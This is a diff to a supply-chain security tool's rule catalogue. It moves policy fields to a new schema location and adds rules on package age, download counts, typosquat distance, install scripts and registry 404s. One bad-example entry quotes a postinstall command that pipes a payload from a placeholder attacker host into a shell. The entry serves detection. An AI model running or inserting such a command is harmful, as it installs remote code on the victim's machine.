@@ -1465,10 +1465,10 @@ id = "package_dependency_confusion"
 title = "Package matches an internal-name pattern"
 category = "ecosystem"
 severity_rationale = "High — a public-registry resolution of a name the operator declared internal is the textbook dependency-confusion attack shape (the `@ns/util` shape the 2021 attack used)."
-description = "tirith fetched a package from the public registry whose name matches a pattern the policy declares is for internal use only. Sources: (a) the operator-supplied `internal_package_names` policy list (a temporary top-level field; ch7 moves it under `package_policy.internal_package_names`); (b) registry-namespace shape — an `@<reserved-org>/<name>` npm package resolved on the public registry. Without an operator-supplied internal-names list, only the obvious public-namespace shape trips this."
-examples_bad = ["tirith install npm @your-company/internal-helper --online (with `internal_package_names: ['@your-company/*']` in policy)"]
+description = "tirith fetched a package from the public registry whose name matches a pattern the policy declares is for internal use only. Sources: (a) the operator-supplied `package_policy.internal_package_names` policy list (M6 ch7 schema location); (b) registry-namespace shape — an `@<reserved-org>/<name>` npm package resolved on the public registry. Without an operator-supplied internal-names list, only the obvious public-namespace shape trips this."
+examples_bad = ["tirith install npm @your-company/internal-helper --online (with `package_policy.internal_package_names: [{ ecosystem: npm, name: '@your-company/*' }]` in policy)"]
 examples_good = ["tirith install npm @your-company/internal-helper --online from a configured private registry that the public registry does not shadow"]
-false_positive_guidance = "Without policy-supplied internal names, only the obvious public-namespace patterns trip. Add `internal_package_names` entries to your policy (top-level for M6 ch6; will move to `package_policy.internal_package_names` in ch7) so this rule has the data it needs to fire on your real internal packages."
+false_positive_guidance = "Without policy-supplied internal names, only the obvious public-namespace patterns trip. Add `package_policy.internal_package_names` entries to your policy so this rule has the data it needs to fire on your real internal packages. Each entry is `{ ecosystem: <eco>?, name: <pattern> }` — a trailing `*` is a wildcard."
 remediation = "Pin the install to the private registry directly (`--registry`), or scope-pin via your package manager's config (`@org:registry=https://...` in `.npmrc`)."
 
 [[rule]]
@@ -1490,5 +1490,60 @@ severity_rationale = "High — a registry-claimed repository URL that is dead or
 description = "Under `--online` only: tirith fetched the package's registry-claimed repository URL and verified (a) the URL is reachable (HTTP 200), (b) it parses as a known git-hosting URL, and (c) the hosted repository's manifest mentions this package name. A mismatch — dead URL, unparseable URL, or hosted manifest naming a different package — emits this rule. Offline default state is `Unverifiable` and no finding is emitted."
 examples_bad = ["a npm package whose package.json `repository: github.com/popular/project` URL is reachable but the hosted package.json names a different package"]
 examples_good = ["a npm package whose `repository` URL resolves to a repo whose package.json names the same package"]
-false_positive_guidance = "Requires `--online`. The check is capped at the top N packages by score (default 50; configurable via ch7's `repo_mismatch_check_max_packages`), so a clean low-score package will not be verified — that is honest no-data, not a finding. Verification is best-effort; an unreachable URL flagged by this rule could be a transient outage."
+false_positive_guidance = "Requires `--online`. The check is capped at the top N packages by score (default 50; configurable via `package_policy.repo_mismatch_check_max_packages`), so a clean low-score package will not be verified — that is honest no-data, not a finding. Verification is best-effort; an unreachable URL flagged by this rule could be a transient outage."
 remediation = "Investigate the package on its registry page and find the correct, current source repository. If the repository field is intentionally wrong (e.g. an old fork URL), update the package's metadata upstream."
+
+[[rule]]
+id = "package_policy_newer_than_days"
+title = "Package newer than the configured age threshold"
+category = "ecosystem"
+severity_rationale = "Warn baseline (warn_newer_than_days) and Block-elevation (block_newer_than_days). A brand-new package has no community track record; strict environments block under a configurable day threshold."
+description = "The policy's `package_policy.warn_newer_than_days` or `block_newer_than_days` crosses the registry-reported `package_age_days`. Requires `--online` to gather the age signal — offline runs cannot fire this rule. Block fires when both thresholds are configured and the age is at or below the Block threshold; otherwise Warn."
+examples_bad = ["`tirith install npm foo --online` with `block_newer_than_days: 7` against a package published 3 days ago"]
+examples_good = ["`tirith install npm requests --online` against a package whose first publication is years old"]
+false_positive_guidance = "Genuinely new but legitimate releases will trip this — a v0.1.0 release of a brand-new dependency you intentionally want to ship. Lift the threshold or allowlist the specific package."
+remediation = "Wait for the package to age (community usage exposes bugs and malware) or pin to a known-aged version."
+
+[[rule]]
+id = "package_policy_low_downloads"
+title = "Package has low recent downloads"
+category = "ecosystem"
+severity_rationale = "Warn — low recent downloads on a public-registry package suggest unfamiliarity or abandonment; in strict environments this is an explicit warn surface configurable via `warn_low_downloads_below`."
+description = "The policy's `package_policy.warn_low_downloads_below` is at or above the registry-reported `recent_downloads` count. Requires `--online` to gather the downloads signal — offline runs cannot fire this rule. Warn only; there is no Block elevation path (low downloads alone is too weak)."
+examples_bad = ["`tirith install npm obscure-pkg --online` where the package has 5 weekly downloads and policy carries `warn_low_downloads_below: 100`"]
+examples_good = ["`tirith install npm react --online` — millions of weekly downloads"]
+false_positive_guidance = "Internal-org packages mirrored to the public registry can carry low downloads legitimately. Allowlist the package or remove the threshold for the affected ecosystems."
+remediation = "Verify the package's intentional adoption (the project's GitHub, the npm/pypi/crates.io page) before installing; consider mirroring or pinning a known-safe version."
+
+[[rule]]
+id = "package_policy_typosquat_distance"
+title = "Package name within configured typosquat distance of a popular name"
+category = "ecosystem"
+severity_rationale = "Block — `block_typosquat_distance` is the operator's explicit declaration that names within N edits of a popular package are too risky to install. Distinct from the threat-DB `ThreatPackageTyposquat` (which carries a DB-confirmed `popular → typosquat` row) and `ThreatPackageSimilarName` (the advisory cousin)."
+description = "The `name_vs_popular` classification is `NearPopular` AND the resolved edit distance is at or below the policy's `block_typosquat_distance`. Block. The threat DB must be installed for `NearPopular` to fire — see `threat-db update`."
+examples_bad = ["`tirith install npm reqeusts` (typo, distance 1 from `requests`) with `block_typosquat_distance: 1`"]
+examples_good = ["`tirith install npm requests` (the popular package itself)"]
+false_positive_guidance = "Legitimate distinct packages sometimes sit a single edit from a popular peer (`request` vs `requests`). Use `allowlist` or `allowlist_rules` to exempt the specific known-real names."
+remediation = "Install the intended popular package, or — if the name was intentional — exempt it via the policy allowlist with reviewer notes."
+
+[[rule]]
+id = "package_policy_unknown_package_with_install_scripts"
+title = "Unknown package ships install-time network or shell scripts"
+category = "ecosystem"
+severity_rationale = "Block — the combination of `NameVsPopular::Unknown` AND an install-script signal (network call or shell spawn) is the textbook supply-chain malware vector. The `package_policy.block_install_scripts_for_unknown_packages: true` toggle elects to hard-block."
+description = "The package's `name_vs_popular` classification is `Unknown` AND its install-script analysis flagged either `has_network_call` or `has_shell_spawn`. Block. Requires the install-script signal to be available; offline `tirith install` cannot evaluate this and prints '(install-script signal not available offline — pass `--online` to evaluate)'."
+examples_bad = ["`tirith install npm unknown-package --online` where the registry response carries a `scripts.postinstall: 'curl https://evil.example/payload | sh'`"]
+examples_good = ["`tirith install npm unknown-package --online` where no install script exists, or every script is a local file operation"]
+false_positive_guidance = "Legitimate niche packages can have install scripts that fetch a build artifact. Set the policy back to `false` (the M6 ch6 baseline) or add the specific package to `allowlist`."
+remediation = "Read the install script directly (`tirith package risk --path <pkg>`), verify its source, and either allowlist the package or refuse the install."
+
+[[rule]]
+id = "package_policy_not_found"
+title = "Package positively not found in registry"
+category = "ecosystem"
+severity_rationale = "Block — when policy carries `block_not_found: true` and the registry confirms 404 (`PackageExistence::NotFound`), the package cannot be the one the operator intended. Distinct from `package_not_found_in_registry` (M6 ch6, Medium-baseline) — the ch7 rule is the operator's explicit Block toggle."
+description = "Requires `--online`: the registry positively responded HTTP 404 for `(ecosystem, name)`. `PackageExistence::Unknown` (timeout / unsupported registry / offline) does not fire this rule — we never block on absence-of-data, only on a positive 404. The ch6 sibling `package_not_found_in_registry` fires Medium-baseline on the same evidence; this rule adds the policy-driven Block elevation."
+examples_bad = ["`tirith install npm nonexistent-package-xyz123 --online` with `block_not_found: true`"]
+examples_good = ["`tirith install npm react --online` — registry confirms the package exists"]
+false_positive_guidance = "Cannot fire under bare offline `tirith install` (output prints '(package-existence signal requires --online)'). A genuine 404 is unambiguous evidence."
+remediation = "Verify the package name's spelling and the intended registry. The name may be a typo, may belong to a private registry the public registry does not know about, or may be a stale removed package."
